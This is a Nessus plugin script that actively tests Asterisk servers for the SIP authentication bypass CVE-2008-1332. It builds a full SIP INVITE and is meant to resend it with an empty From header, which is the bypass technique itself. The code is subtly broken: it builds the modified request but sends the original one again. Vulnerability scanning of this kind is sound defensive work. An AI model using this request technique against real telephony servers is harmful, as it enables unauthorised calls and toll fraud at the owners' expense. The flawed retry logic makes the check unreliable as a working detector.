#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(32135);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/05/04 14:21:29 $");

  script_cve_id("CVE-2008-1332");
  script_bugtraq_id(28310);
  script_osvdb_id(43415);

  script_name(english:"Asterisk SIP Remote Authentication Bypass");
  script_summary(english:"Sends an INVITE message with an empty From header");

  script_set_attribute(attribute:"synopsis", value:
"It is possible to bypass authentication and make calls using the
remote VoIP service.");
  script_set_attribute(attribute:"description", value:
"The version of Asterisk running on the remote host allows
unauthenticated calls via the SIP channel driver.  Using a specially
crafted From header, a remote attacker can bypass authentication and 
make calls into the context specified in the 'general' section of
'sip.conf'.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/489818/100/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://downloads.digium.com/pub/security/AST-2008-003.html");
  # http://web.archive.org/web/20081219180626/http://www.asterisk.org/node/48466
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9367816e");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Asterisk 1.2.27 / 1.4.18.1 / 1.4.19-rc3 / 1.6.0-beta6,
Asterisk Business Edition B.2.5.1 / C.1.6.2, AsteriskNOW 1.0.2, Asterisk
Appliance Developer Kit 1.4 revision 109393, s800i (Asterisk Appliance)
1.1.0.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/05/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/03/18");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:asterisk:asterisk_business_edition");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("asterisk_detection.nasl");
  script_require_ports("Services/udp/sip", "Services/sip");
  script_require_keys("asterisk/sip_detected", "Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

get_kb_item_or_exit("asterisk/sip_detected");

asterisk_kbs = get_kb_list("sip/asterisk/*/version");
if (isnull(asterisk_kbs)) exit(1, "Could not obtain any version information from listening Asterisk SIP server(s).");

is_vuln = FALSE;
not_vuln_installs = make_list();
errors = make_list();

foreach kb_name (keys(asterisk_kbs))
{
  item = eregmatch(pattern:"/(udp|tcp)/([0-9]+)/version", string:kb_name);
  if (isnull(item)) exit(1, 'Unexpected error parsing port number from kb name.');

  proto = item[1];
  port  = item[2];
  version = asterisk_kbs[kb_name];

  if (version == 'unknown')
    errors = make_list(errors, "Unable to obtain version of install on " + proto + "/" + port);

  if (proto == 'udp')
  {
    if (!get_udp_port_state(port))
    {
      errors = make_list(errors, proto + " port " + port + " is not open");
      continue;
    }

    if (islocalhost())
      soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:port, dport:port);
  }
  else
  {
    if (!get_tcp_port_state(port))
    {
      errors = make_list(errors, proto + " port " + port + " is not open");
      continue;
    }
    soc = open_sock_tcp(port);
  }

  if (!soc)
  {
    errors = make_list(errors, "Failed to open a " + proto + " socket on port " + port);
    continue;
  }

  via_protocol = proto;

  encaps = get_port_transport(port);
  if (!isnull(encaps) && proto == 'tcp')
  {
    if (encaps && encaps > ENCAPS_IP)
      via_protocol = 'tls';
  }

  # Try to initiate a call.
  data = 'v=0\r\n' +
         'o=user1 53655765 2353687637 IN IP4 ' + this_host() + '\r\n' +
         's=-\r\n' +
         'c=IN IP4 ' +  this_host() + '\r\n' +
         't=0 0\r\n' +
         'm=audio 6000 RTP/AVP 0\r\n' +
         'a=rtpmap:0 PCMU/8000';

  invite = 'INVITE sip:service@' + get_host_ip() + ':' + port + ' SIP/2.0\r\n' +
           'Via: SIP/2.0/' + toupper(via_protocol) + ' ' + this_host() + ':5060;branch=z9hG4bKfe06f452-2dd6-db11-6d02-000b7d0dc672;rport\r\n' +
           'From: "' + SCRIPT_NAME + '" <sip:nessus@' + this_host() + ':' + port + '>;tag=de92d852-2dd6-db11-9d02-000b7d0dc672\r\n' +
           'To: <sip:nessus@' + get_host_ip() + ':' + port + '>\r\n' +
           'Call-ID: cee2c112a8faaedd9daf1f94a4ce7095@' +  this_host() + '\r\n' +
           'CSeq: 1 INVITE\r\n' +
           "Contact: <sip:nessus@" + this_host() + '>\r\n' +
           'Max-Forwards: 70\r\n' +
           'Subject: ' + SCRIPT_NAME + '\r\n' +
           'Content-Type: application/sdp\r\n' +
           'Content-Length: ' + strlen(data) + '\r\n\r\n' + data;

  send(socket:soc, data:invite);
  res = recv(socket:soc, length:1024);

  if (!strlen(res) || isnull(res))
  {
    close(soc);
    errors = make_list(errors, "Received no response or a zero-length response to INVITE request on "+proto+" port "+port);
    continue;
  }

  response_code = egrep(pattern:"^SIP/", string:res);

  if (strlen(response_code) < 1)
  {
    errors = make_list(errors, "Received no response code to INVITE request on "+proto+" port "+port);
    continue;
  }

  # If we get a FORBIDDEN response...
  if (ereg(pattern:"^SIP/[0-9]\.[0-9] 403 ", string:response_code))
  {
    # Re-try the call with an empty From line.
    invite2 = invite - strstr(invite, 'From: ') +
      'From: \r\n' +
      strstr(invite, 'To: ');
    invite2 = ereg_replace(pattern:"CSeq: 1 ", replace:"CSeq: 2 ", string:invite2);

    send(socket:soc, data:invite);
    res2 = recv(socket:soc, length:1024);

    close(soc);
    if (!strlen(res2) || isnull(res2))
    {
      errors = make_list(errors, "Received no response or a zero-length response to INVITE request with empty 'From:' line on "+proto+" port "+port);
      continue;
    }

    # There's a problem if the call does not yield a 403 response now.
    response_code2 = egrep(pattern:"^SIP/", string:res2);
    if (
      response_code2 &&
      ereg(pattern:"^SIP/[0-9]\.[0-9] ([1235-9][0-9][0-9]|4(0[24-9]|[1-9][0-9])) ", string:response_code2)
    )
    {
      security_warning(port:port, proto:proto);
      is_vuln = TRUE;
    }
    else not_vuln_installs = make_list(not_vuln_installs, version + " on port " + proto + "/" + port);
  }
  else not_vuln_installs = make_list(not_vuln_installs, version + " on port " + proto + "/" + port);
}

if (max_index(errors))
{
  if (max_index(errors) == 1) errmsg = errors[0];
  else errmsg = 'Errors were encountered verifying installs : \n  ' + join(errors, sep:'\n  ');

  exit(1, errmsg);
}
else
{
  installs = max_index(not_vuln_installs);
  if (installs == 0)
  {
    if (is_vuln)
      exit(0);
    else
      audit(AUDIT_NOT_INST, "Asterisk");
  }
  else if (installs == 1) audit(AUDIT_INST_VER_NOT_VULN, "Asterisk " + not_vuln_installs[0]);
  else exit(0, "The Asterisk installs (" + join(not_vuln_installs, sep:", ") + ") are not affected.");
}
